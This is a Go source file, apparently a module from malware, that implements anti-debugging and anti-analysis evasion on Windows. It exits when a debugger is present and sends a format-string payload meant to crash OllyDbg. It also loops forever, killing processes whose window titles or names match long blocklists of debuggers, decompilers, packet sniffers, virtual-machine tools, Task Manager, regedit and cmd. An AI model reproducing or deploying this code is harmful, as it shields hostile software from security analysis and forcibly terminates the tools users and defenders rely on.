package antidebug

import (
	"github.com/shirou/gopsutil/v3/process"
	"strings"
	"syscall"
	"unsafe"
	"os"
)

var (
		mu32   = syscall.NewLazyDLL("user32.dll")
		pew          = mu32.NewProc("EnumWindows")
		pgwt       = mu32.NewProc("GetWindowTextA")
		pgwtp = mu32.NewProc("GetWindowThreadProcessId")
		mk32 = syscall.NewLazyDLL("kernel32.dll")
		pop         = mk32.NewProc("OpenProcess")
		ptp    = mk32.NewProc("TerminateProcess")
		pch         = mk32.NewProc("CloseHandle")
		pidp = mk32.NewProc("IsDebuggerPresent")
	    // we exploit log console (olly and other debuggers)
		k32             = syscall.MustLoadDLL("kernel32.dll")
		DebugStrgingA   = k32.MustFindProc("OutputDebugStringA")
		gle         = k32.MustFindProc("GetLastError")
	
)

func IsDebuggerPresent() {
	flag, _, _ := pidp.Call()
    if flag != 0 {
        os.Exit(-1)
    }
}

func Run() {
	IsDebuggerPresent()
	for{

	// for debuggers like x64dbg or any other
	OutputDebugStringAntiDebug()
	// this is for ollydbg 
	OllyDbgExploit("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
	ewp := syscall.NewCallback(ewpg)
	ret, _, _ := pew.Call(ewp, 0)
	if ret == 0 {
		return
	}
	blacklist := []string{"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice", "wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc", "vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice", "qemu-ga", "prl_cc", "prl_tools", "cmd", "joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker", "joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler", "x96dbg", "dumpcap", "vboxservice"}

	KillProcesses(blacklist)
}
}

func OutputDebugStringAntiDebug() bool {
	naughty := "hm"
	txptr, _ := syscall.UTF16PtrFromString(naughty)
	DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
	ret, _, _ := gle.Call()
	return ret == 0
}

func OllyDbgExploit(text string) {
    txptr, err := syscall.UTF16PtrFromString(text)
    if err != nil {
        panic(err)
    }
    DebugStrgingA.Call(uintptr(unsafe.Pointer(txptr)))
}


func ewpg(hwnd uintptr, lParam uintptr) uintptr {
	// blacklisted window names
	var pid uint32
	pgwtp.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

	var title [256]byte
	pgwt.Call(hwnd, uintptr(unsafe.Pointer(&title)), 256)
	wt := string(title[:])

	bs := []string{
		"proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy",
		"titanHide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly",
		"process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor",
		"debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded",
		"dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza",
		"crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark",
		"debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper",
		"petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox",
		"dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg",
		"httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom",
		"mdbg", "WPE PRO", "system explorer", "de4dot", "x64dbg", "X64NetDumper", "protection_id",
		"charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd",
		"0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker",
		"harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice",
		"folder", "mitmproxy", "dbx", "sniffer", "Process Hacker",
	}

	for _, str := range bs {
		if containz(wt, str) {
			proc, _, _ := pop.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
			if proc != 0 {
				ptp.Call(proc, 0)
				pch.Call(proc)
			}
			break
		}
	}

	return 1
}

func containz(s, substr string) bool {
	// pattern finding for the widnows lol
	return len(s) >= len(substr) && s[:len(substr)] == substr
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if strings.Contains(item, s) {
			return true
		}
	}
	return false
}

func KillProcesses(blacklist []string) {
		processes, _ := process.Processes()

		for _, p := range processes {
			name, _ := p.Name()
			name = strings.ToLower(name)

			if contains(blacklist, name) {
				p.Kill()
			}
		}
}
